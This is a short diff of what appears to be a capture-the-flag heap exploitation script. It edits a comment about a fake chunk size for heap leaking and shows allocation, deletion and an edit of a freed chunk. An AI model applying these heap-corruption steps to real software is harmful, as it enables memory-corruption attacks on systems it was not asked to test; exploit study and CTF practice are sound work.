@@ -31,7 +31,7 @@ def Delete(idx):
 for i in range(6):
   Create()
 
-# Make fake chunk sizeof 0x3c1 for heap leaking
+# Make fake chunk sizeof 0x3c0 for heap leaking
 Delete(4)
 Delete(5)
 Edit(5, "\x00")
